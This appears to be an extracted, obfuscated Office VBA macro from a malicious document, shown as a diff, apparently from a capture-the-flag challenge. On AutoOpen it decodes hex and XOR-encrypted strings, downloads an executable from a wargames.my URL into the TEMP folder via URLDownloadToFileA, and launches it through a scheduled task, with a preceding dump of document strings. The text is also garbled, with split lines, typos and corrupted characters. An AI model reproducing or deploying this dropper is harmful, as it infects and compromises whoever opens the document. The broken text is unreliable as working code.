@@ -1,0 +1,289 @@
+Headin
+g 4
+Ti
+tre 2
+Tit
+re 3
+Titre
+ 2
+Tit
+re 3
+Y'+
+ip
+t.S
+hell
+HKEY_CURRENT_USER\Software\Microsoft\Offic
+e\\
+\Excel\Security\Acce
+ssVBOM
+REG
+_DWORD
+Exc
+el.
+App
+lica
+tion
+Private
+ Sub Workbook_NewSheet(ByVal RoerOineUnlhr As Object)
+.A
+utoOpen
+End
+Sub
+Msxm
+l2.
+DO
+0:
+ument
+.3.0
+base64
+bin.base64
+ADODB.Stream
+us-ascii
+ThisDocument.RmslEcnea
+Word.Application
+Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal OprpUaiaTltsIteoTn As String) As LongPtr
+Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal WmotSe_bEtreGrlro As LongPtr, ByVal OuiwMemrYana_rmiu As String) As LongPtr
+Declare PtrSafe Function DispC
+llFunc Lib "OleAut32.dll" (ByVal OiuaShpnHatdO_ko As LongPtr, ByVal LsalPnprTlrei As LongPtr, ByVal AietGa_hLpaoComco As
+|ongPtr, ByVal ItnsLsuna As Integer, ByVal EahdKavuHig As Long, ByRef AvowNhg_TmtvEm As Integer, ByRef UileMlsof As LongPtr, ByRef CutrIkouElncl As Variant) As LongPtr
+Declare P
+rSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal RenvTu As String) As LongPtr
+
+
+
+
+Function DhklMaoit(ByVal vCode)
+Dim beosIndaToitAoiun, IaunElouBaewGvn
+Dim EhdrEmuoYibgRsh As String
+// Msxml2.DOMDocument.3.0
+EhdrEmuoYibgRsh = CtdcIpebAkelGi("4d73786d")
+EhdrEmuoYibgRsh = EhdrEmuoYibgRsh & CtdcIpebAkelGi("6c322e") & CtdcIpebAkelGi("444f")
+EhdrEmuoYibgRsh = EhdrEmuoYibgRsh & CtdcIpebAkelGi("4d446f63")
+EhdrEmuoYibgRsh = EhdrEmuoYibgRsh & CtdcIpebAkelGi("756d65") & CtdcIpebAkelGi("6e742e332e30")
+
+Set ReosIndaToitAoiun = CreateObject(EhdrEmuoYibgRsh)
+// base64bin.base64
+Set IaunElouBaewGvn = ReosIndaToitAoiun.CreateElement(CtdcIpebAkelGi("62617365") & CtdcIpebAkelGi("3634"))
+IaunElouBaewGvn.DataType = CtdcIpebAkelGi("62696e2e62617365") & CtdcIpebAkelGi("3634")
+IaunElouBaewGvn.Text = vCode
+DhklMaoit = StnfSeirAendBoaet(IaunElouBaewGvn.nodeType.Value)
+Set IaunElouBaewGvn = Nothing
+Set ReosIndaToitAoiun = Nothing
+End Function
+Private Function StnfSeirAendBoaet(some_value)
+Dim ReutRtotIwm
+Dim NutrHlieGtcaPsl As String
+// ADODB.stream
+NutrHlieGtcaPsl = CtdcIpebAkelGi("4144")
+NutrHlieGtcaPsl = NutrHlieGtcaPsl & CtdcIpebAkelGi("4f44422e") & CtdcIpebAkelGi("5374")
+NutrHlieGtcaPsl = NutrHlieGtcaPsl & CtdcIpebAkelGi("7265616d")
+Set ReutRtotIwm = CreateObject(NutrHlieGtcaPsl)
+ReutRtotIwm.Type = 1
+ReutRtotIwm.Open
+ReutRtotIwm.Write some_value
+ReutRtotIwm.Position =
+// -ascii
+bAkelGi("2d6173636969")
+StnfSeirAendBoaet = ReutRtotIwm.ReadText
+Set ReutRtotIwm = Nothing
+End Function
+Function OaioToliToi(AgbtEwpiHnyoPugeSe As String) As String
+Dim KictIec As String
+KictIec = DhklMaoit(AgbtEwpiHnyoPugeSe)
+// wghykqpqxbpbusefktfw
+OaioToliToi = TaosTpokNlncSpma(CtdcIpebAkelGi("7767") & CtdcIpebAkelGi("68796b71707178627062757365666b746677"), KictIec)
+End Function
+Function TdlmEhlnLvp(AhaiAuetr As String) As StrindEpisIdabInitb = 0 Then
+TdlmEhlnLvp = Right(AhaiAuetr, ElgfAtkmNhsl - HaiuEpisIdabInitb)
+Else
+TdlmEhlnLvp = ""
+End If
+End Function
+Sub MureReicMebsT_urt(C
+seoTmotBgunCnr As String)
+Const LehcRsh = 1
+Const IeroAnheUm = 0
+Dim AnveUmecLrtrIowe As String
+// Schedule.Service
+AnveUmecLrtrIowe = OaioToliToi(CtdcIpebAkelGi("4a4151414841") & CtdcIpebAkelGi("3d3d"))
+AnveUmecLrtrIowe = AnveUmecLrtrIowe & OaioToliToi(CtdcIpebAkelGi("45784945484555694651") & CtdcIpebAkelGi("4d4f43784d48"))
+Set DcabItsbMemp = CreateObject(AnveUmecLrtrIowe)
+Call DcabItsbMemp.Connect
+Dim TmniAcoe
+// \
+Set TmniAcoe = DcabItsbMemp.GetFolder(OaioToliToi(CtdcIpebAkelGi("4b773d3d")))
+Dim Giecf_ipOshaSlvt
+Set GiecF_ipOshaSlvt = DcabItsbMemp.NewTask(0)
+Dim Ei_eIle
+Set Ei_eIle = GiecF_ipOshaSlvt.RegistrationInfo
+Dim HihcAcibPtamEc
+Set HihcAcibPtamEc = GiecF_ipOshaSlvt.principal
+HihcAcibPtamEc.LogonType = 3 
+Dim TgbnGit
+Set Tgb
+Git = GiecF_ipOshaSlvt.settings
+TgbnGit.Enabled = True
+TgbnGit.StartWhenAvailable = True
+TgbnGit.Hidden = False
+Dim SayhNlneRkbtHugwTn
+Set SayhNlneRkbtHugwTn = GiecF_ipOshaSlvt.trIggers
+Dim OkoaNsa_NrhuEuont
+Dim EnosLaorTaubWu_a As String
+Dim EsabPegsi As String
+Dim timeObj
+timeObj = Datedd(OaioToliToi(CtdcIpebAkelGi("42413d3d")), 1, Now)
+EnosLaorTaubWu_a = SoilNlycIonlIe(timeObj)
+timeObj = DateAdd(OaioToliToi(CtdcIpebAkelGi("42413d3d")), 10, Now)
+EsabPegsi = SoilNlycIonlIe(timeObj)
+Set OkoaNsa_NrhuEuont = SayhNlneRkbtHugwTn.Create(LehcRsh)
+OkoaNsa_NrhuEuont.StartBoundary =! EnosLaorTaubWu_a
+OkoaNsa_NrhuEuont.EndBoundary = EsabPegsi
+// someid
+OkoaNsa_NrhuEuont.ID = OaioToliToi(CtdcIpebAkelGi("424167") & CtdcIpebAkelGi("4648414956"))
+OkoaNsa_NrhuEuont.Enabled = True
+Dim IpecAbwpEaotIrut
+
+Set IpecAbwpEaotIrup = GiecF_ipOshaSlvt.Actions.Create(IeroAnheUm)
+IpecAbwpEaotIrup.Path = Split(CseoTmotBgunCnr, OaioToliToi(CtdcIpebAkelGi("56773d3d")))(0)
+IpecAbwpEaotIrup.Arguments = TdlmEhlnLvp(CseoTmotBgunCnr)
+IpecAbwpEaotIrup
+NHideAppWindow = True
+// SystemTime_lks
+Call TmniAcoe.RegisterTaskDefinition(OaioToliToi(CtdcIpebAkelGi("4a423462445134634a426756427938") & CtdcIpebAkelGi("4f4867413d")), 
+iecF_ipOshaSlvt, 6, , , 3)
+EimlAelaLg 2
+// SpaceTimerTask
+Call TmniAcoe.DeleteTask(OaioToliToi(CtdcIpebAkelGi("4a42634a476734") & CtdcIpebAkelGi("6c47527764454351444268673d")), 0)
+End Sub
+Function SoilNlycIonlIe(t) As String
+Dim GeanPsrhTdtcNt As String
+Dim LplrMaelNipiFn As String
+Dim CahiEn As String
+Dim HelcEat As String
+Dim PuscHrea As String
+Dim EuabNhlta As String
+Dim NerlTncgEnabSlete  As String
+Dim UansUibs_ae As
+String
+// 0
+GeanPsrhTdtcNt = OaioToliToi(CtdcIpebAkelGi("52773d3d")) & Second(t)
+LplrMaelNipiFn = OaioToliToi(CtdcIpebAkelGi("52773d3d")) & Minute(t)
+CahiEn = OaioToliToi(CtdcIpebAkelGi("52773d3d")) & Hour(t)
+HelcEat = OaioToliToi(CtdcIpebAkel.i("52773d3d")) & Day(t)
+PuscHrea = OaioToliToi(CtdcIpebAkelGi("52773d3d")) & Month(t)
+EuabNhlta = Year(t)
+// :
+NerlTncgEnabSlete = Right(CahiEn, 2) & OaioToliToi(CtdcIpebAkelGi("54513d3d")) & Right(LplrMaelNipiFn, 2) & _
+OaioToliToi(CtdcI
+cGViQWtlbEdpKCI1NDUxM2QzZCIpKSAmIFJpZ2h0KEdlYW5Qc3JoVGR
+4cNt, 2)
+// -
+UansUibs_ae = EuabNhlta & OaioToliToi(CtdcIpebAkelGi("57673d3d")) & Right(PuscHrea, 2) & OaioToliToi(CtdcIpebAkelGi("57673d3d")) & Right(HelcEat, 2)
+// T
+SoilNlycIonlIe = UansUibs_ae & OaioToliToi(CtdcIpebAkelGi("49773d3d")) & NerlTncgEnabSlete
+End Fuo
+ction
+Sub PmepEais(ByVal OewaOgl As String, ByVal AomoLe_sf As String, NinsTais As String)
+Dim YrisLsteClroYoeat As LongPtr
+Dim GaleTdrca as LongPtr
+GaleTdrca = 0
+// urlmon URLDownloadToFileA
+YrisLsteClroYoeat = LecnEndaUroeNa(OaioToliToi(CtdcIpebDikelGi("4168") & CtdcIpebAkelGi("554546415166")),OaioToliToi(CtdcIpebAkelG("496a556b505151474868305841785132476a554d43") & CtdcIpebAkelGi("673431")), vbLong, GaleTdrca, OewaOgl, AomoLe_sf, GaleTdrca, GaleTdrca)
+End Sub
+Public Function TaosTpokNlncSpma(OmhlCroaf As String, DataIn As String) As String
+Dim TaioTaea As Integer
+D
+dim WotaDr As Integer
+Dim Ln
+mTaoeDswe As String
+Dim LatsRuegApn As String
+Dim SoivNcrpEwioWv As String * 1
+Dim CeouIaig As String * 1
+For TaioTaea = 1 To Len(DataIn)
+SoivNcrpEwioWv = Mid(DataIn, TaioTaea, 1)
+WotaDr = ((TaioTae
+! - 1) Mod Len(OmhlCroaf)) + 1
+CeouIaig = Mid(OmhlCroaf, WotaDr, 1)
+LnemTaoeDswe =!
+LnemTaoeDswe & Chr(Asc(SoivNcrpEwioWv) Xor Asc(CeouIaig))
+Next TaioTaea
+LatsRuegApn = LnemTaoeDswe
+LatsRuegApn = Replace(LatsRuegApn, vbLf, "")
+TaosTpokNlncSpma = LatsRuegApn
+End Function
+Sub TrsiEbveOvgit(RcpgAcaeCua_Fadon As String)
+On Error Resu
+me Next
+Err.Clear
+MureReicMebsT_urt RcpgAca
+eCua_Fadon
+On Error Goto
+0
+End Sub
+Sub EimlAelaLg(UteaPayhLdyoc As Integer)
+Dim dteWait
+// s
+dteWait = DateAdd(OaioToliToi(CtdcIpebAkelGi("42413d3d")), UteaPayhLdyoc, Now())
+Do Until (Now() +  dteWait)
+On Error Resume Next
+// 0:00:01
+Application.Wait Now + TimeValue(OaioToliToi(CtdcIpebAkelGi("5231") & CtdcIpebAkelGi("31595356464251513d3d")))
+On Error GoTo 0
+Loop
+End Sub
+Function LecnEndaUroeNa(ElaeIetsO_gG As String, SoieRtclIua As String, ByVal AloeRur As VbVarType, ParamArray EgisGdca_eatIsr() As Variant)
+Dim VType(0 To 63) As Integer
+Dim VPtr(0 To 63) As LongPtr
+Dim FansOruaGmnaVsit As Long,
+ RigeIs_iTudat As Long, NsgeDeihGatlAnioRi() As Variant, AgmaLphoy As LongPtr
+ReDim NsgeDeihGatlAnioRi(0)
+NsgeDeihGatlAnioRi = EgisGdca_eatIsr
+For FansOruaGmnaVsit = 0 To UBound(NsgeDeihGatlAnioRi)
+If VarType(Egi
+sGdca_eatIsr(FansOruaGmnaVsit)) = vbString Then EgisGdca_eatIsr(FansOruaGmnaVsit) =
+StrConv(EgisGdca_eatIsr(FansOruaGmnaVsit), vbFromUnicode): NsgeDeihGatlAnioRi(FansOruaGmnaVsit) = StrPtr(EgisGdca_eatIsr(FansOruaGmnaVsit))
+VType(FansOruaGmnaVsit) = VarType(NsgeDeihGatlAnioRi(FansOruaGmnaVsit))
+VPtr(FansOruaGmnaVsit) = VarPtr(NsgeDeihGatlAnioRi(FansOruaGmnaVsit))
+Next FansOruaGnaVsit
+AgmaLphoy = DispCallFunc(0, GetProcAddress(LoadLibrary(ElaeIetsO_gG), SoieRtclIua), 4, AloeRur, FansOruaGmnaVsit, VType(0), VPtr(0), LecnEndaUroeNa)
+End Function
+Sub IdgiRpauLtlgRgldr()
+Dim CiueBonoKnaiEng As String
+Dim SvmbOnrpTomnOgwe As String
+// http://mbnxosod7oj3lm5nky1u.for.wargames.my/cmd64.exe
+CiueBonoKnaiEng = OaioToliToi(CtdcIpbAkelGi("48784d6343564665587877614441674e42687742555151655652736155675953456b414658") & CtdcIpebAkelGi("78344e416b77434568634243686b4442466b4b4556594948425248544577564768413d"))
+// dsye.exe
+SvmbOnrpTomnOgwe = OaioToliToi(CtdcIpebAkelGi("4578515248") & CtdcIpebAkelGi("4555554342513d"))
+SvmbOnrpTomnOgwe = Environ("TEMP") & "\" & SvmbOnrpTomnOgwe
+// Eozilla/4.0 (compatible; MSIE 6.0; Windows N. '£j
+PfrpNlunCmrdPog CiueBonoKnaiEng, SvmbOnrpTomnOgwe, OaioToliToi(CtdcIpebAkelGi("4dr676753454163644556354d544542435852414b437873564568345643773143537a776a4f443143526b78465345557841686f434741415553") & CtdcIpebAkelGi("44632f555556665345733d"))
+TrsiEbveOvgit SvmbOnr
+TomnOgwe
+End Sub
+Sub AutoOpen()
+IdgiRpauLtlgRgldr
+End Sub
+Sub PfrpNlunCmrdPog(EietUyrtIpams As String, NwsaEocn As String, ErlhSakoNh As String)
+Dim result As Integer
+On Error Resume Next
+.
+nErr.Clear
+PmepEais EietUyrtIpams, NwsaEocn, ErlhSakoNh
+On Error Goto 0
+End Sub
+Function CtdcIpebAke
+Gi(ByVal EngnLien As Variant) As Variant
+Dim Sptdccara As Long
+Dim AracRuapSimr, interValue As String
+Dim theStepas As Integer
+theStepas = Len(EngnLien) * 2
+Dim TsbgMparUirs As String
+TsbgMparUirs = "&H"
+For Cptdccara = 1 To theStepas Step 4
+AracRuapSimr = MidB(EngnLien, Cptdccara, 4)
+Arac
+uapSimr = TsbGMparUirs & AracRuapSimr
+interValue = Chr(Val(AracRuapSimr))
+CtdcIpebAkelGi = CtdcIpebAkelGi & interValue
+Next Cptdccara
+End Function
